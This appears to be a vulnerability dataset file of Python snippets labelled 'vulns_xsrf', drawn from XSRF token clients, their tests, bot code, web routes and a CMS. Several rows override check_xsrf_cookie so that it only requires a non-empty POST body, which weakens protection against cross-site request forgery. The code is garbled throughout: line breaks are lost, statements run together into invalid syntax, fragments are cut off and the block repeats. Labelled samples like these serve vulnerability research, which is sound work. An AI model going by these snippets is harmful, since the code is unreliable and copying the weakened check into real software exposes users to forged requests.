"    def get(self, path, get_args='', as_json=True):        request = request_mock(path)    def post(self, path, body='', headers=None):        request = request_mock(path=path, method=""POST"", body=body, headers=headers)    def put(self, path, body):        request = request_mock(path=path, method=""PUT"", body=body, headers={'Content-Type': ['application/json']})    def delete(self, path, body=""""):        request = request_mock(path=path, body=body, headers={'Content-Type': ['application/json']}, method=""DELETE"")",vulns_xsrf
"    def get_attachment(self, ident, encoding, filename=None, content_type=None):        deferred_result, req = self.get(""/attachment/%s"" % ident, params, as_json=False)",vulns_xsrf
"def request_mock(path='', method='GET', body='', headers={}):",vulns_xsrf
from pixelated.resources.root_resource import RootResource,vulns_xsrf
"    client.listenTCP()    proxy = Proxy(proxy_port='8889', app_port='4567')    context.call_to_terminate_proxy = proxy.run_on_a_thread()",vulns_xsrf
    context.call_to_terminate_proxy(),vulns_xsrf
            xsrf_header = request.getHeader('x-xsrf-token'),vulns_xsrf
class TestServiceDefinition(unittest.TestCase):,vulns_xsrf
import jsonlog = logging.getLogger(__name__),vulns_xsrf
"        try:            content = json.loads(response.body)            if isinstance(content, (list, tuple)):                log.warn(""returning a json array is a potential security whole, ""                         ""please ensure you really want to do this. See ""                         ""http://wiki.pylonshq.com/display/pylonsfaq/Warnings ""                         ""for more info"")        except:            pass",vulns_xsrf
"    def check_xsrf_cookie(self):        """"""Check non-empty body on POST for XSRF        instead of checking the cookie for forms.        """"""        if self.request.method.upper() == 'POST' and not self.request.body:            raise web.HTTPError(400, ""POST requests must have a JSON body. If no content is needed, use '{}'."")",vulns_xsrf
        if self.token_authenticated:,vulns_xsrf
"        self.set_header('Access-Control-Allow-Headers', 'accept, content-type, authorization')",vulns_xsrf
"    def check_xsrf_cookie(self):        """"""Check non-empty body on POST for XSRF        instead of checking the cookie for forms.        """"""        if self.request.method.upper() == 'POST' and not self.request.body:            raise web.HTTPError(400, ""POST requests must have a JSON body. If no content is needed, use '{}'."")",vulns_xsrf
        if self.token_authenticated:,vulns_xsrf
"        self.set_header('Access-Control-Allow-Headers', 'accept, content-type, authorization')",vulns_xsrf
"    def check_xsrf_cookie(self):        """"""Check non-empty body on POST for XSRF        instead of checking the cookie for forms.        """"""        if self.request.method.upper() == 'POST' and not self.request.body:            raise web.HTTPError(400, ""POST requests must have a JSON body. If no content is needed, use '{}'."")",vulns_xsrf
        if self.token_authenticated:,vulns_xsrf
"    def check_xsrf_cookie(self):        """"""Check non-empty body on POST for XSRF        instead of checking the cookie for forms.        """"""        if self.request.method.upper() == 'POST' and not self.request.body:            raise web.HTTPError(400, ""POST requests must have a JSON body. If no content is needed, use '{}'."")",vulns_xsrf
        if self.token_authenticated:,vulns_xsrf
"        self.set_header('Access-Control-Allow-Headers', 'accept, content-type, authorization')",vulns_xsrf
"  version = os.environ['CURRENT_VERSION_ID']      str(version),",vulns_xsrf
            method='POST'):,vulns_xsrf
"        url_response = urllib2.urlopen(request, timeout=URL_OPEN_TIMEOUT).read()        url_response = urllib2.urlopen(url, encoded_data,                                       timeout=URL_OPEN_TIMEOUT).read()        url_response = urllib2.urlopen(url, timeout=URL_OPEN_TIMEOUT).read()",vulns_xsrf
"    url_helper.urllib2.urlopen(mox.StrContains(url),",vulns_xsrf
"    url_helper.urllib2.urlopen(url, mox.IgnoreArg(),                               timeout=mox.IgnoreArg()).AndReturn(                                   StringIO.StringIO(response))",vulns_xsrf
"        mox.IgnoreArg(), mox.IgnoreArg(), timeout=mox.IgnoreArg()).AndRaise(    url_helper.urllib2.urlopen(mox.IgnoreArg(), mox.IgnoreArg(),",vulns_xsrf
"        mox.IgnoreArg(), mox.IgnoreArg(), timeout=mox.IgnoreArg()).AndRaise(",vulns_xsrf
"        mox.IgnoreArg(), mox.IgnoreArg(), timeout=mox.IgnoreArg()).AndRaise(",vulns_xsrf
"        mox.IgnoreArg(), mox.IgnoreArg(), timeout=mox.IgnoreArg()).AndRaise(        mox.IgnoreArg(), mox.IgnoreArg(), timeout=mox.IgnoreArg()).AndReturn(",vulns_xsrf
"          mox.IgnoreArg(), encoded_data, timeout=mox.IgnoreArg()).AndRaise(",vulns_xsrf
"    url_helper.urllib2.urlopen(mox.StrContains(url), mox.IgnoreArg(),",vulns_xsrf
        self.xsrf_token_data = self.verify_xsrf_token(),vulns_xsrf
"    self.assertEqual(        403, app.post('/request', bad_token, expect_errors=True).status_int)",vulns_xsrf
"      ""xsrf_token"": ""......"",  xsrf_token_enforce_on = ()  @auth.require_xsrf_token_request",vulns_xsrf
"    'bot_code/xsrf_client.py',",vulns_xsrf
from bot_code import common,vulns_xsrf
"      self, remote, attributes, server, server_version, base_dir,      shutdown_hook):    self._remote = remote",vulns_xsrf
"  @property  def remote(self):    """"""XsrfClient instance to talk to the server.    Should not be normally used by bot_config.py for now.    """"""    return self._remote",vulns_xsrf
"    self._remote.url_read_json('/swarming/api/v1/bot/event', data=data)",vulns_xsrf
"        None,        'https://localhost:1/',",vulns_xsrf
"    obj = bot.Bot(None, {}, 'https://localhost:1/', '1234-1a2b3c4-tainted-joe',    obj = bot.Bot(None, {}, 'https://localhost:1/', '1234-1a2b3c4-tainted-joe',",vulns_xsrf
import xsrf_client,vulns_xsrf
    self.server = xsrf_client.XsrfRemote('https://localhost:1/'),vulns_xsrf
"        self.server, self.attributes, 'https://localhost:1/', 'version1',        self.root_dir, self.fail)",vulns_xsrf
"    self.mock(bot_main, 'get_remote', lambda: self.server)",vulns_xsrf
"    self.mock(bot_main, 'get_remote', lambda: self.server)    self.mock(os_utilities, 'get_state', lambda : {'foo': 'bar'})          (            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',            {              'data': expected_attribs,              'headers': {'X-XSRF-Token-Request': '1'},            },            {'xsrf_token': 'token'},          ),",vulns_xsrf
"              'headers': {'X-XSRF-Token': 'token'},            {},    bot_main.post_error_task(botobj, 'error', 23)",vulns_xsrf
"      self.assertEqual(botobj.remote, self.server)      self.assertEqual(self.server, botobj._remote)    self.mock(bot_main, 'get_remote', lambda: self.server)",vulns_xsrf
"        os_utilities.get_hostname_short(), os.environ['SWARMING_BOT_ID'])",vulns_xsrf
"          (            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},            {'xsrf_token': 'token'},          ),            {              'data': self.attributes,              'headers': {'X-XSRF-Token': 'token'},            },",vulns_xsrf
"          (            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},            {'xsrf_token': 'token'},          ),            {              'data': self.bot._attributes,              'headers': {'X-XSRF-Token': 'token'},            },",vulns_xsrf
"          (            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},            {'xsrf_token': 'token'},          ),            {              'data': self.attributes,              'headers': {'X-XSRF-Token': 'token'},            },",vulns_xsrf
"          (            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},            {'xsrf_token': 'token'},          ),            {              'data': self.attributes,              'headers': {'X-XSRF-Token': 'token'},            },",vulns_xsrf
"          (            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},            {'xsrf_token': 'token'},          ),              'headers': {'X-XSRF-Token': 'token'},",vulns_xsrf
    unittest.TestCase.maxDiff = None,vulns_xsrf
import xsrf_client,vulns_xsrf
    swarming_server: XsrfRemote instance.,vulns_xsrf
"  resp = swarming_server.url_read_json(      '/swarming/api/v1/bot/task_update/%s' % params['task_id'], data=params)",vulns_xsrf
"  remote = xsrf_client.XsrfRemote(options.swarming_server)        options.in_file, remote, options.cost_usd_hour, options.start,        options.out_file, options.min_free_space)",vulns_xsrf
import xsrf_client,vulns_xsrf
"      (        'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',        {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},        {'xsrf_token': 'token'},      ),",vulns_xsrf
"          'headers': {'X-XSRF-Token': 'token'},",vulns_xsrf
"        'headers': {'X-XSRF-Token': 'token'},",vulns_xsrf
    server = xsrf_client.XsrfRemote('https://localhost:1/')    server = xsrf_client.XsrfRemote('https://localhost:1/'),vulns_xsrf
    server = xsrf_client.XsrfRemote('https://localhost:1/'),vulns_xsrf
"            'headers': {'X-XSRF-Token': 'token'},      (        'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',        {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},        {'xsrf_token': 'token'},      ),",vulns_xsrf
"          'headers': {'X-XSRF-Token': 'token'},",vulns_xsrf
"          'headers': {'X-XSRF-Token': 'token'},",vulns_xsrf
"      self.assertEqual('http://localhost', swarming_server.url)",vulns_xsrf
"      self.assertEqual('http://localhost', swarming_server.url)",vulns_xsrf
"            'headers': {'X-XSRF-Token': 'token'},    server = xsrf_client.XsrfRemote('https://localhost:1/')",vulns_xsrf
    server = xsrf_client.XsrfRemote('https://localhost:1/'),vulns_xsrf
"            'headers': {'X-XSRF-Token': 'token'},      (        'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',        {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},        {'xsrf_token': 'token'},      ),",vulns_xsrf
"            'headers': {'X-XSRF-Token': 'token'},      (        'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',        {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},        {'xsrf_token': 'token'},      ),",vulns_xsrf
"""""""Wraps URL requests with an XSRF token using components/auth based service.""""""import datetimeimport loggingimport sysTHIS_DIR = os.path.dirname(os.path.abspath(__file__))sys.path.insert(0, os.path.join(THIS_DIR, 'third_party'))from utils import netclass Error(Exception):  passdef _utcnow():  """"""So it can be mocked.""""""  return datetime.datetime.utcnow()class XsrfRemote(object):  """"""Transparently adds XSRF token to requests.""""""  TOKEN_RESOURCE = '/auth/api/v1/accounts/self/xsrf_token'  def __init__(self, url, token_resource=None):    self.url = url.rstrip('/')    self.token = None    self.token_resource = token_resource or self.TOKEN_RESOURCE    self.expiration = None    self.xsrf_request_params = {}  def url_read(self, resource, **kwargs):    url = self.url + resource    if kwargs.get('data') == None:      return net.url_read(url, **kwargs)    if self.need_refresh():      self.refresh_token()    resp = self._url_read_post(url, **kwargs)    if resp is None:      raise Error('Failed to connect to %s; %s' % (url, self.expiration))    return resp  def url_read_json(self, resource, **kwargs):    url = self.url + resource    if kwargs.get('data') == None:      return net.url_read_json(url, **kwargs)    if self.need_refresh():      self.refresh_token()    resp = self._url_read_json_post(url, **kwargs)    if resp is None:      raise Error('Failed to connect to %s; %s' % (url, self.expiration))    return resp  def refresh_token(self):    """"""Returns a fresh token. Necessary as the token may expire after an hour.    """"""    url = self.url + self.token_resource    resp = net.url_read_json(        url,        headers={'X-XSRF-Token-Request': '1'},        data=self.xsrf_request_params)    if resp is None:      raise Error('Failed to connect to %s' % url)    self.token = resp['xsrf_token']    if resp.get('expiration_sec'):      exp = resp['expiration_sec']      exp -= min(round(exp * 0.1), 600)      self.expiration = _utcnow() + datetime.timedelta(seconds=exp)    return self.token  def need_refresh(self):    """"""Returns True if the XSRF token needs to be refreshed.""""""    return (        not self.token or (self.expiration and self.expiration <= _utcnow()))  def _url_read_post(self, url, **kwargs):    headers = (kwargs.pop('headers', None) or {}).copy()    headers['X-XSRF-Token'] = self.token    return net.url_read(url, headers=headers, **kwargs)  def _url_read_json_post(self, url, **kwargs):    headers = (kwargs.pop('headers', None) or {}).copy()    headers['X-XSRF-Token'] = self.token    return net.url_read_json(url, headers=headers, ",vulns_xsrf
"import datetimeimport loggingimport sysimport timeimport unittestimport test_env_bot_codetest_env_bot_code.setup_test_env()import net_utilsimport xsrf_clientclass UrlHelperTest(net_utils.TestCase):  def setUp(self):    super(UrlHelperTest, self).setUp()    self.mock(logging, 'error', lambda *_: None)    self.mock(logging, 'exception', lambda *_: None)    self.mock(logging, 'info', lambda *_: None)    self.mock(logging, 'warning', lambda *_: None)    self.mock(time, 'sleep', lambda _: None)  def testXsrfRemoteGET(self):    self.expected_requests([('http://localhost/a', {}, 'foo', None)])    remote = xsrf_client.XsrfRemote('http://localhost/')    self.assertEqual('foo', remote.url_read('/a'))  def testXsrfRemoteSimple(self):    self.expected_requests(        [          (            'http://localhost/auth/api/v1/accounts/self/xsrf_token',            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},            {              'expiration_sec': 100,              'xsrf_token': 'token',            },          ),          (            'http://localhost/a',            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token'}},            'foo',            None,          ),        ])    remote = xsrf_client.XsrfRemote('http://localhost/')    self.assertEqual('foo', remote.url_read('/a', data={'foo': 'bar'}))  def testXsrfRemoteRefresh(self):    self.expected_requests(        [          (            'http://localhost/auth/api/v1/accounts/self/xsrf_token',            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},            {              'expiration_sec': 100,              'xsrf_token': 'token',            },          ),          (            'http://localhost/a',            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token'}},            'bar',            None,          ),          (            'http://localhost/auth/api/v1/accounts/self/xsrf_token',            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},            {              'expiration_sec': 100,              'xsrf_token': 'token2',            },          ),          (            'http://localhost/a',            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token2'}},            'foo',            None,          ),        ])    now = xsrf_client._utcnow()    remote = xsrf_client.XsrfRemote('http://localhost/')    remote.url_read('/a', data={'foo': 'bar'})    self.mock(        xsrf_client, '_utcnow', lambda: now + datetime.timedelta(seconds=91))    remote.url_read('/a', data={'foo': 'bar'})  def testXsrfRemoteCustom(self):    self.expected_requests(        [          (            'http://localhost/swarming/api/v1/bot/handshake',            {              'data': {'attributes': 'b'},              'headers': {'X-XSRF-Token-Request': '1'},            },            {              'expiration_sec': 100,              'ignored': True,              'xsrf_token': 'token',            },          ),          (            'http://localhost/a',            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token'}},            'foo',            None,          ),        ])    remote = xsrf_client.XsrfRemote(        'http://localhost/',        '/swarming/api/v1/bot/handshake')    remote.xsrf_request_params = {'attributes': 'b'}    self.assertEqual('foo', remote.url_read('/a', data={'foo': 'bar'}))if __name__ == '__main__':  logging.basicConfig(level=logging.ERROR)  unitt",vulns_xsrf
    self.fail('Unknown request %s' % url),vulns_xsrf
"  for cls in _ui_navbar_tabs:    routes.extend(cls.get_webapp2_routes())  routes.extend([    webapp2.Route(r'/auth', MainHandler),    webapp2.Route(r'/auth/bootstrap', BootstrapHandler, name='bootstrap'),    webapp2.Route(r'/auth/bootstrap/oauth', BootstrapOAuthHandler),    webapp2.Route(r'/auth/link', LinkToPrimaryHandler),  ])",vulns_xsrf
"  return [    webapp2.Route(    webapp2.Route(    webapp2.Route(    webapp2.Route(    webapp2.Route(      '/ereporter2/api/v1/on_error', OnErrorHandler),  ]",vulns_xsrf
"      webapp2.Route(r'/_ah/mail/<to:.+>', EmailHandler),      webapp2.Route(r'/_ah/warmup', WarmupHandler),  ]",vulns_xsrf
  routes = get_routes(),vulns_xsrf
"      ('/_ah/mail/<to:.+>', EmailHandler),      ('/_ah/warmup', WarmupHandler),  ]",vulns_xsrf
"    return open_closed_tags(lxml.html.tostring(fragment, method='xml'))",vulns_xsrf
"    http_handler = create_website_http_handler(purpose, **kwargs)",vulns_xsrf
        xsrf_token.__name__,vulns_xsrf
        set_xsrf_cookie_for_page.__name__,vulns_xsrf
    if 'GET' != request.method.upper():,vulns_xsrf
"version = ""0.0.3dev2""version_info = (0, 0, 3, 12)",vulns_xsrf
"        self.assets = Environment(                os.path.join(os.path.dirname(__file__), '../static'),'/static')        css_all = Bundle(                'css/bootstrap.min.css',                'css/material.min.css',                Bundle('css/schoolcms.css','css/dropdown.css', filters='cssmin'),                'outdatedbrowser/outdatedbrowser.min.css',                output='dict/plugin.min.css')        js_all = Bundle(                Bundle(                    'outdatedbrowser/outdatedbrowser.min.js',                    'react-0.13.2/react-with-addons.min.js',                    'js/jquery-2.1.3.min.js',                    'js/bootstrap.min.js',                    'js/react-bootstrap.min.js',                    'js/react-mini-router.min.js',                    'js/marked.min.js',                    'js/material.min.js',                    'js/isMobile.min.js',                    'js/moment-with-locales.min.js',                    'js/dropdown.js',filters='jsmin'),                Bundle(                    'schoolcms/init.jsx',                    'schoolcms/mixin/*.jsx',                    'schoolcms/component/*.jsx',                    'schoolcms/page/*.jsx', filters=('react','jsmin')),                output='dict/plugin.min.js')        self.assets.register('css_all', css_all)        self.assets.register('js_all', js_all)",vulns_xsrf
                q = q.order_by(Announce.created.desc()),vulns_xsrf
                q = q.filter(Announce.created >= start_time),vulns_xsrf
"  version = os.environ['CURRENT_VERSION_ID']      str(version),",vulns_xsrf
            method='POST'):,vulns_xsrf
"        url_response = urllib2.urlopen(request, timeout=URL_OPEN_TIMEOUT).read()        url_response = urllib2.urlopen(url, encoded_data,                                       timeout=URL_OPEN_TIMEOUT).read()        url_response = urllib2.urlopen(url, timeout=URL_OPEN_TIMEOUT).read()",vulns_xsrf
"    url_helper.urllib2.urlopen(mox.StrContains(url),",vulns_xsrf
"    url_helper.urllib2.urlopen(url, mox.IgnoreArg(),                               timeout=mox.IgnoreArg()).AndReturn(                                   StringIO.StringIO(response))",vulns_xsrf
"        mox.IgnoreArg(), mox.IgnoreArg(), timeout=mox.IgnoreArg()).AndRaise(    url_helper.urllib2.urlopen(mox.IgnoreArg(), mox.IgnoreArg(),",vulns_xsrf
"        mox.IgnoreArg(), mox.IgnoreArg(), timeout=mox.IgnoreArg()).AndRaise(",vulns_xsrf
"        mox.IgnoreArg(), mox.IgnoreArg(), timeout=mox.IgnoreArg()).AndRaise(",vulns_xsrf
"        mox.IgnoreArg(), mox.IgnoreArg(), timeout=mox.IgnoreArg()).AndRaise(        mox.IgnoreArg(), mox.IgnoreArg(), timeout=mox.IgnoreArg()).AndReturn(",vulns_xsrf
"          mox.IgnoreArg(), encoded_data, timeout=mox.IgnoreArg()).AndRaise(",vulns_xsrf
"    url_helper.urllib2.urlopen(mox.StrContains(url), mox.IgnoreArg(),",vulns_xsrf
        self.xsrf_token_data = self.verify_xsrf_token(),vulns_xsrf
"    self.assertEqual(        403, app.post('/request', bad_token, expect_errors=True).status_int)",vulns_xsrf
"      ""xsrf_token"": ""......"",  xsrf_token_enforce_on = ()  @auth.require_xsrf_token_request",vulns_xsrf
"    'bot_code/xsrf_client.py',",vulns_xsrf
from bot_code import common,vulns_xsrf
"      self, remote, attributes, server, server_version, base_dir,      shutdown_hook):    self._remote = remote",vulns_xsrf
"  @property  def remote(self):    """"""XsrfClient instance to talk to the server.    Should not be normally used by bot_config.py for now.    """"""    return self._remote",vulns_xsrf
"    self._remote.url_read_json('/swarming/api/v1/bot/event', data=data)",vulns_xsrf
"        None,        'https://localhost:1/',",vulns_xsrf
"    obj = bot.Bot(None, {}, 'https://localhost:1/', '1234-1a2b3c4-tainted-joe',    obj = bot.Bot(None, {}, 'https://localhost:1/', '1234-1a2b3c4-tainted-joe',",vulns_xsrf
import xsrf_client,vulns_xsrf
    self.server = xsrf_client.XsrfRemote('https://localhost:1/'),vulns_xsrf
"        self.server, self.attributes, 'https://localhost:1/', 'version1',        self.root_dir, self.fail)",vulns_xsrf
"    self.mock(bot_main, 'get_remote', lambda: self.server)",vulns_xsrf
"    self.mock(bot_main, 'get_remote', lambda: self.server)    self.mock(os_utilities, 'get_state', lambda : {'foo': 'bar'})          (            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',            {              'data': expected_attribs,              'headers': {'X-XSRF-Token-Request': '1'},            },            {'xsrf_token': 'token'},          ),",vulns_xsrf
"              'headers': {'X-XSRF-Token': 'token'},            {},    bot_main.post_error_task(botobj, 'error', 23)",vulns_xsrf
"      self.assertEqual(botobj.remote, self.server)      self.assertEqual(self.server, botobj._remote)    self.mock(bot_main, 'get_remote', lambda: self.server)",vulns_xsrf
"        os_utilities.get_hostname_short(), os.environ['SWARMING_BOT_ID'])",vulns_xsrf
"          (            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},            {'xsrf_token': 'token'},          ),            {              'data': self.attributes,              'headers': {'X-XSRF-Token': 'token'},            },",vulns_xsrf
"          (            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},            {'xsrf_token': 'token'},          ),            {              'data': self.bot._attributes,              'headers': {'X-XSRF-Token': 'token'},            },",vulns_xsrf
"          (            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},            {'xsrf_token': 'token'},          ),            {              'data': self.attributes,              'headers': {'X-XSRF-Token': 'token'},            },",vulns_xsrf
"          (            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},            {'xsrf_token': 'token'},          ),            {              'data': self.attributes,              'headers': {'X-XSRF-Token': 'token'},            },",vulns_xsrf
"          (            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},            {'xsrf_token': 'token'},          ),              'headers': {'X-XSRF-Token': 'token'},",vulns_xsrf
    unittest.TestCase.maxDiff = None,vulns_xsrf
import xsrf_client,vulns_xsrf
    swarming_server: XsrfRemote instance.,vulns_xsrf
"  resp = swarming_server.url_read_json(      '/swarming/api/v1/bot/task_update/%s' % params['task_id'], data=params)",vulns_xsrf
"  remote = xsrf_client.XsrfRemote(options.swarming_server)        options.in_file, remote, options.cost_usd_hour, options.start,        options.out_file, options.min_free_space)",vulns_xsrf
import xsrf_client,vulns_xsrf
"      (        'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',        {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},        {'xsrf_token': 'token'},      ),",vulns_xsrf
"          'headers': {'X-XSRF-Token': 'token'},",vulns_xsrf
"        'headers': {'X-XSRF-Token': 'token'},",vulns_xsrf
    server = xsrf_client.XsrfRemote('https://localhost:1/')    server = xsrf_client.XsrfRemote('https://localhost:1/'),vulns_xsrf
    server = xsrf_client.XsrfRemote('https://localhost:1/'),vulns_xsrf
"            'headers': {'X-XSRF-Token': 'token'},      (        'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',        {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},        {'xsrf_token': 'token'},      ),",vulns_xsrf
"          'headers': {'X-XSRF-Token': 'token'},",vulns_xsrf
"          'headers': {'X-XSRF-Token': 'token'},",vulns_xsrf
"      self.assertEqual('http://localhost', swarming_server.url)",vulns_xsrf
"      self.assertEqual('http://localhost', swarming_server.url)",vulns_xsrf
"            'headers': {'X-XSRF-Token': 'token'},    server = xsrf_client.XsrfRemote('https://localhost:1/')",vulns_xsrf
    server = xsrf_client.XsrfRemote('https://localhost:1/'),vulns_xsrf
"            'headers': {'X-XSRF-Token': 'token'},      (        'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',        {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},        {'xsrf_token': 'token'},      ),",vulns_xsrf
"            'headers': {'X-XSRF-Token': 'token'},      (        'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',        {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},        {'xsrf_token': 'token'},      ),",vulns_xsrf
"""""""Wraps URL requests with an XSRF token using components/auth based service.""""""import datetimeimport loggingimport sysTHIS_DIR = os.path.dirname(os.path.abspath(__file__))sys.path.insert(0, os.path.join(THIS_DIR, 'third_party'))from utils import netclass Error(Exception):  passdef _utcnow():  """"""So it can be mocked.""""""  return datetime.datetime.utcnow()class XsrfRemote(object):  """"""Transparently adds XSRF token to requests.""""""  TOKEN_RESOURCE = '/auth/api/v1/accounts/self/xsrf_token'  def __init__(self, url, token_resource=None):    self.url = url.rstrip('/')    self.token = None    self.token_resource = token_resource or self.TOKEN_RESOURCE    self.expiration = None    self.xsrf_request_params = {}  def url_read(self, resource, **kwargs):    url = self.url + resource    if kwargs.get('data') == None:      return net.url_read(url, **kwargs)    if self.need_refresh():      self.refresh_token()    resp = self._url_read_post(url, **kwargs)    if resp is None:      raise Error('Failed to connect to %s; %s' % (url, self.expiration))    return resp  def url_read_json(self, resource, **kwargs):    url = self.url + resource    if kwargs.get('data') == None:      return net.url_read_json(url, **kwargs)    if self.need_refresh():      self.refresh_token()    resp = self._url_read_json_post(url, **kwargs)    if resp is None:      raise Error('Failed to connect to %s; %s' % (url, self.expiration))    return resp  def refresh_token(self):    """"""Returns a fresh token. Necessary as the token may expire after an hour.    """"""    url = self.url + self.token_resource    resp = net.url_read_json(        url,        headers={'X-XSRF-Token-Request': '1'},        data=self.xsrf_request_params)    if resp is None:      raise Error('Failed to connect to %s' % url)    self.token = resp['xsrf_token']    if resp.get('expiration_sec'):      exp = resp['expiration_sec']      exp -= min(round(exp * 0.1), 600)      self.expiration = _utcnow() + datetime.timedelta(seconds=exp)    return self.token  def need_refresh(self):    """"""Returns True if the XSRF token needs to be refreshed.""""""    return (        not self.token or (self.expiration and self.expiration <= _utcnow()))  def _url_read_post(self, url, **kwargs):    headers = (kwargs.pop('headers', None) or {}).copy()    headers['X-XSRF-Token'] = self.token    return net.url_read(url, headers=headers, **kwargs)  def _url_read_json_post(self, url, **kwargs):    headers = (kwargs.pop('headers', None) or {}).copy()    headers['X-XSRF-Token'] = self.token    return net.url_read_json(url, headers=headers, ",vulns_xsrf
"import datetimeimport loggingimport sysimport timeimport unittestimport test_env_bot_codetest_env_bot_code.setup_test_env()import net_utilsimport xsrf_clientclass UrlHelperTest(net_utils.TestCase):  def setUp(self):    super(UrlHelperTest, self).setUp()    self.mock(logging, 'error', lambda *_: None)    self.mock(logging, 'exception', lambda *_: None)    self.mock(logging, 'info', lambda *_: None)    self.mock(logging, 'warning', lambda *_: None)    self.mock(time, 'sleep', lambda _: None)  def testXsrfRemoteGET(self):    self.expected_requests([('http://localhost/a', {}, 'foo', None)])    remote = xsrf_client.XsrfRemote('http://localhost/')    self.assertEqual('foo', remote.url_read('/a'))  def testXsrfRemoteSimple(self):    self.expected_requests(        [          (            'http://localhost/auth/api/v1/accounts/self/xsrf_token',            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},            {              'expiration_sec': 100,              'xsrf_token': 'token',            },          ),          (            'http://localhost/a',            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token'}},            'foo',            None,          ),        ])    remote = xsrf_client.XsrfRemote('http://localhost/')    self.assertEqual('foo', remote.url_read('/a', data={'foo': 'bar'}))  def testXsrfRemoteRefresh(self):    self.expected_requests(        [          (            'http://localhost/auth/api/v1/accounts/self/xsrf_token',            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},            {              'expiration_sec': 100,              'xsrf_token': 'token',            },          ),          (            'http://localhost/a',            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token'}},            'bar',            None,          ),          (            'http://localhost/auth/api/v1/accounts/self/xsrf_token',            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},            {              'expiration_sec': 100,              'xsrf_token': 'token2',            },          ),          (            'http://localhost/a',            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token2'}},            'foo',            None,          ),        ])    now = xsrf_client._utcnow()    remote = xsrf_client.XsrfRemote('http://localhost/')    remote.url_read('/a', data={'foo': 'bar'})    self.mock(        xsrf_client, '_utcnow', lambda: now + datetime.timedelta(seconds=91))    remote.url_read('/a', data={'foo': 'bar'})  def testXsrfRemoteCustom(self):    self.expected_requests(        [          (            'http://localhost/swarming/api/v1/bot/handshake',            {              'data': {'attributes': 'b'},              'headers': {'X-XSRF-Token-Request': '1'},            },            {              'expiration_sec': 100,              'ignored': True,              'xsrf_token': 'token',            },          ),          (            'http://localhost/a',            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token'}},            'foo',            None,          ),        ])    remote = xsrf_client.XsrfRemote(        'http://localhost/',        '/swarming/api/v1/bot/handshake')    remote.xsrf_request_params = {'attributes': 'b'}    self.assertEqual('foo', remote.url_read('/a', data={'foo': 'bar'}))if __name__ == '__main__':  logging.basicConfig(level=logging.ERROR)  unitt",vulns_xsrf
    self.fail('Unknown request %s' % url),vulns_xsrf
"version = ""0.0.3dev2""version_info = (0, 0, 3, 12)",vulns_xsrf
"        self.assets = Environment(                os.path.join(os.path.dirname(__file__), '../static'),'/static')        css_all = Bundle(                'css/bootstrap.min.css',                'css/material.min.css',                Bundle('css/schoolcms.css','css/dropdown.css', filters='cssmin'),                'outdatedbrowser/outdatedbrowser.min.css',                output='dict/plugin.min.css')        js_all = Bundle(                Bundle(                    'outdatedbrowser/outdatedbrowser.min.js',                    'react-0.13.2/react-with-addons.min.js',                    'js/jquery-2.1.3.min.js',                    'js/bootstrap.min.js',                    'js/react-bootstrap.min.js',                    'js/react-mini-router.min.js',                    'js/marked.min.js',                    'js/material.min.js',                    'js/isMobile.min.js',                    'js/moment-with-locales.min.js',                    'js/dropdown.js',filters='jsmin'),                Bundle(                    'schoolcms/init.jsx',                    'schoolcms/mixin/*.jsx',                    'schoolcms/component/*.jsx',                    'schoolcms/page/*.jsx', filters=('react','jsmin')),                output='dict/plugin.min.js')        self.assets.register('css_all', css_all)        self.assets.register('js_all', js_all)",vulns_xsrf
                q = q.order_by(Announce.created.desc()),vulns_xsrf
                q = q.filter(Announce.created >= start_time),vulns_xsrf
"            xsrf_cookie = True,",vulns_xsrf
